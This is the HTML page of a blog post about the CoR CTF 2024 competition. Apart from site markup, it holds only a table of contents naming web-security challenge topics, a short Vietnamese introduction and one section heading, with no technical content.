<!DOCTYPE html>
<html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="dark"
  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8" />
  
  <meta http-equiv="content-language" content="en" />
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
  
  <title>CoR CTF 2024 &middot; hibwyli</title>
  <meta name="title" content="CoR CTF 2024 &middot; hibwyli" />
  
  <meta name="description" content="CoR CTF 2024" />
  <meta name="keywords" content="Web, " />
  
  
  <link rel="canonical" href="//localhost:1313/posts/corctf24/" />
  
  
  
  
  
  
  
  
  
  
  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.857ec6700dbdcae3e112eba9fc29e3aa948366934f76d502f60b6a3e436e12e2f10925d27f3032ad87f18cbcaddb981eca1fa59d74de83da90ade26f5faf75dd.css"
    integrity="sha512-hX7GcA29yuPhEuup/CnjqpSDZpNPdtUC9gtqPkNuEuLxCSXSfzAyrYfxjLyt25geyh&#43;lnXTeg9qQreJvX6913Q==" />
  
  
  <script type="text/javascript" src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
  
  
  
  
  
  
  
  
  
  
  
  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.984038b35a762692ece6c2038acfa3c9b3eb54655e7bd4838c6ccd3ec0fa375df9477c7a5e2cb6212e4e6847a8b6b8aca64624df0467a3d4d876528de8846064.js"
    integrity="sha512-mEA4s1p2JpLs5sIDis&#43;jybPrVGVee9SDjGzNPsD6N135R3x6Xiy2IS5OaEeotrispkYk3wRno9TYdlKN6IRgZA==" data-copy="" data-copied=""></script>
  
  
  
  <script src="/lib/zoom/zoom.min.37d2094687372da3f7343a221a470f6b8806f7891aa46a5a03966af7f0ebd38b9fe536cb154e6ad28f006d184b294525a7c4054b6bbb4be62d8b453b42db99bd.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S&#43;Yti0U7QtuZvQ=="></script>
  
  
  
  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
  <link rel="manifest" href="/site.webmanifest" />
  
  
  
  
  
  
  
  
  <meta property="og:url" content="//localhost:1313/posts/corctf24/">
  <meta property="og:site_name" content="hibwyli">
  <meta property="og:title" content="CoR CTF 2024">
  <meta property="og:description" content="CoR CTF 2024">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-07-29T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-07-29T00:00:00+00:00">
    <meta property="article:tag" content="Web">
    <meta property="og:image" content="//localhost:1313/posts/corctf24/feature_cor.png">

  
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="//localhost:1313/posts/corctf24/feature_cor.png">
  <meta name="twitter:title" content="CoR CTF 2024">
  <meta name="twitter:description" content="CoR CTF 2024">

  
  <script type="application/ld+json">
  [{
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Posts",
    "name": "CoR CTF 2024",
    "headline": "CoR CTF 2024",
    "description": "CoR CTF 2024",
    "abstract": "CoR CTF 2024",
    "inLanguage": "en",
    "url" : "\/\/localhost:1313\/posts\/corctf24\/",
    "author" : {
      "@type": "Person",
      "name": ""
    },
    "copyrightYear": "2024",
    "dateCreated": "2024-07-29T00:00:00\u002b00:00",
    "datePublished": "2024-07-29T00:00:00\u002b00:00",
    
    "dateModified": "2024-07-29T00:00:00\u002b00:00",
    
    "keywords": ["Web"],
    
    "mainEntityOfPage": "true",
    "wordCount": "2033"
  }]
  </script>


  
  
  
  
  

<script src="/lib/jquery/jquery.slim.min.7d88d2a1c0c3e9cb6e435406228f7e367f4e73899f6aed88884f0a8b5172315e0e704494b7cd4532a9a1b197bdcd667a83a35d733ac4300a2cd4694b2c08a95a.js" integrity="sha512-fYjSocDD6ctuQ1QGIo9&#43;Nn9Oc4mfau2IiE8Ki1FyMV4OcESUt81FMqmhsZe9zWZ6g6NdczrEMAos1GlLLAipWg=="></script>






















  
  



  
  
  <meta name="theme-color"/>
  
  
</head>
<body
  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
  <div id="the-top" class="absolute flex self-center">
    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
      href="#main-content"><span
        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
  </div>
  
  
  <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start space-x-3">
    
    <div class="flex flex-1 items-center justify-between">
        <nav class="flex space-x-3">

            
            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">hibwyli</a>
            

        </nav>
        <nav class="hidden md:flex items-center space-x-5 md:ml-12 h-12">

            
            
            
  <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-base font-medium" title="Posts">
        Posts
    </p>
</a>



            
            
  <a href="/about/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-base font-medium" title="About">
        About
    </p>
</a>



            
            
  <a href="/categories/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-base font-medium" title="Categories">
        Categories
    </p>
</a>



            
            
  <a href="/tags/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-base font-medium" title="Tags">
        Tags
    </p>
</a>



            
            

            


            
            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
                title="">
                

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


            </button>
            


            
            
            <div
                class="ltr:mr-14 rtl:ml-14 flex items-center">
                <button id="appearance-switcher" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400">
                    <div class="flex items-center justify-center dark:hidden">
                        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>

  </span>


                    </div>
                    <div class="items-center justify-center hidden dark:flex">
                        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>

  </span>


                    </div>
                </button>
            </div>
            

        </nav>
        <div class="flex md:hidden items-center space-x-5 md:ml-12 h-12">

            <span></span>

            


            
            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
                title="">
                

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


            </button>
            

            
            
            <button id="appearance-switcher-mobile" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400" style="margin-right:5px">
                <div class="flex items-center justify-center dark:hidden">
                    

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>

  </span>


                </div>
                <div class="items-center justify-center hidden dark:flex">
                    

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>

  </span>


                </div>
            </button>
            

        </div>
    </div>
    <div class="-my-2 -mr-2 md:hidden">

        <label id="menu-button" class="block">
            
            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
                

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>

  </span>


            </div>
            <div id="menu-wrapper" style="padding-top:5px;"
                class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
                <ul
                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">

                    <li id="menu-close-button">
                        <span
                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>

  </span>

</span>
                    </li>

                    

                    
  <li class="mt-1">
    <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="Posts">
            Posts
        </p>
    </a>
</li>




                    

                    
  <li class="mt-1">
    <a href="/about/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="About">
            About
        </p>
    </a>
</li>




                    

                    
  <li class="mt-1">
    <a href="/categories/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="Categories">
            Categories
        </p>
    </a>
</li>




                    

                    
  <li class="mt-1">
    <a href="/tags/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="Tags">
            Tags
        </p>
    </a>
</li>




                    

                </ul>
                
                <hr>
                <ul
                    class="flex mt-4 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">


                    
                    <li class="mb-1">
                        <a href="/tags/pwnable/"  class="flex items-center">
                            
                            <p class="text-sm font-sm text-gray-500 hover:text-gray-900" title="Pwnable">
                                Pwnable
                            </p>
                        </a>
                    </li>
                    
                    <li class="mb-1">
                        <a href="/tags/web/"  class="flex items-center">
                            
                            <p class="text-sm font-sm text-gray-500 hover:text-gray-900" title="Web">
                                Web
                            </p>
                        </a>
                    </li>
                    
                    <li class="mb-1">
                        <a href=""  class="flex items-center">
                            
                            <span  class="mr-3" >
                                

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>

  </span>


                            </span>
                            
                            <p class="text-sm font-sm text-gray-500 hover:text-gray-900" title="">
                                Write up
                            </p>
                        </a>
                    </li>
                    

                </ul>
                
                

            </div>
        </label>
    </div>
</div>


<div class="main-menu flex pb-3 flex-col items-end justify-between md:justify-start space-x-3" >
    <div class="hidden md:flex items-center space-x-5">
        
        <a href="/tags/pwnable/"  class="flex items-center">
            
            <p class="text-xs font-light text-gray-500 hover:text-gray-900" title="Pwnable">
                Pwnable
            </p>
        </a>
        
        <a href="/tags/web/"  class="flex items-center">
            
            <p class="text-xs font-light text-gray-500 hover:text-gray-900" title="Web">
                Web
            </p>
        </a>
        
        <a href=""  class="flex items-center">
            
            <span  class="mr-1" >
                

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>

  </span>


            </span>
            
            <p class="text-xs font-light text-gray-500 hover:text-gray-900" title="">
                Write up
            </p>
        </a>
        
    </div>
</div>




  
  <div class="relative flex flex-col grow">
    <main id="main-content" class="grow">
      


<article>
  
  
  
  
  
  


<div id="hero" class="h-[150px] md:h-[200px]"></div>



    
    <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"
    style="background-image:url(/posts/corctf24/feature_cor.png);">
    


    <div class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal">
    </div>
    <div
        class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal">
    </div>
</div>

<div id="background-blur" class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl"></div>
<script>
    window.addEventListener('scroll', function (e) {
        var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
        var background_blur = document.getElementById('background-blur');
        background_blur.style.opacity = (scroll / 300)
    });
</script>

  
  

  <header id="single_header" class="mt-5 max-w-prose">
    
    <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
  
  
    
  
    
  
  <li class="inline hidden">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="/"
      >hibwyli</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="inline ">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="/posts/"
      >Posts</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="inline hidden">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="/posts/corctf24/"
      >CoR CTF 2024</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

</ol>


    
    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
      CoR CTF 2024
    </h1>
    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
      





  
  







  







  













<div class="flex flex-row flex-wrap items-center">
  
  
  <time datetime="2024-07-29T00:00:00&#43;00:00">29 July 2024</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">10 mins</span>
  

  
  
</div>


<div class="flex flex-row flex-wrap items-center">
  
  
  
  
     <div style="cursor: pointer;" onclick="window.open(&#34;/authors/shin24/&#34;,'_self');return false;">Shin24</div>
  
  
  
  
  
  
  
  
  
  
</div>




<div class="flex flex-row flex-wrap items-center">
  
  
  
  
  
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/writeup/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Writeup
  </span>
</span>
  </span>
  
  
  
  
  
  
  
  
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/web/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Web
  </span>
</span>
  </span>
  
  
  
  
</div>




    </div>

    
    
    
    
    

    

    
      
      
        
        
<div class="flex author">
  
  <div class="place-self-center">
    
    
    <div class="text-2xl sm:text-lg">
</div>
  </div>
</div>

      

      
        

      
      <div class="mb-5"></div>
      

    

  </header>
  
  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
    
     <div
      class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-10">

         <details open id="TOCView"
  class="toc-right mt-0 overflow-y-scroll overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
  <summary
    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#corctf-challenge-dev">corctf-challenge-dev</a></li>
    <li><a href="#iframe-note">Iframe-note</a>
      <ul>
        <li><a href="#clide-side-prototype-pollution">Clide-side Prototype pollution</a></li>
        <li><a href="#werkzeug">Werkzeug</a></li>
        <li><a href="#chrome-disk-cache">Chrome disk cache</a></li>
        <li><a href="#exploit">Exploit</a></li>
      </ul>
    </li>
    <li><a href="#corchat-x">corchat x</a>
      <ul>
        <li><a href="#jsonp">JSONP</a></li>
        <li><a href="#leaking-flag-with-performanceobserver">Leaking flag with PerformanceObserver</a></li>
      </ul>
    </li>
    <li><a href="#repayment-pal-pending">repayment-pal (PENDING)</a></li>
  </ul>
</nav>
  </div>
</details>
<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
  <summary
    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#corctf-challenge-dev">corctf-challenge-dev</a></li>
    <li><a href="#iframe-note">Iframe-note</a>
      <ul>
        <li><a href="#clide-side-prototype-pollution">Clide-side Prototype pollution</a></li>
        <li><a href="#werkzeug">Werkzeug</a></li>
        <li><a href="#chrome-disk-cache">Chrome disk cache</a></li>
        <li><a href="#exploit">Exploit</a></li>
      </ul>
    </li>
    <li><a href="#corchat-x">corchat x</a>
      <ul>
        <li><a href="#jsonp">JSONP</a></li>
        <li><a href="#leaking-flag-with-performanceobserver">Leaking flag with PerformanceObserver</a></li>
      </ul>
    </li>
    <li><a href="#repayment-pal-pending">repayment-pal (PENDING)</a></li>
  </ul>
</nav>
  </div>
</details>

<script>

  var margin = 200;
  var marginError = 50;

  (function () {
    var $window = $(window);
    var $toc = $('#TOCView');
    var tocHeight = $toc.height();

    function onResize() {
      var windowAndMarginHeight = $window.height() - margin;
      if(tocHeight >= windowAndMarginHeight) {
        $toc.css("overflow-y", "scroll")
        $toc.css("max-height", (windowAndMarginHeight + marginError) + "px")
      } else {
        $toc.css("overflow-y", "hidden")
        $toc.css("max-height", "9999999px")
      }
    }

    $window.on('resize', onResize);
    $(document).ready(onResize);
  })();



</script>
   </div>
      </div>
      

      <div class="min-w-0 min-h-0 max-w-fit">
        
        


        <div class="article-content max-w-prose mb-20">
          <p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/user-attachments/assets/4782fee7-ae9b-427d-9d22-dff266ee2ee1" alt="image" />
    
  </figure>
</p>
<p>Ở giải này mình làm được <strong>3/6</strong> bài, 3 bài còn lại có số solve lần lượt 2,1 và 0&hellip; Ở đây mình sẽ viết writeup ngắn cho 1 bài mình làm được và 3 bài chưa solve được nhằm ép mình ngồi học, bắt đầu nào</p>


<h2 class="relative group">corctf-challenge-dev 
    <div id="corctf-challenge-dev" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#corctf-challenge-dev" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/user-attachments/assets/c3016b37-8ee7-4fa7-b453-9afa13ba789c" alt="image" />
    
  </figure>
</p>
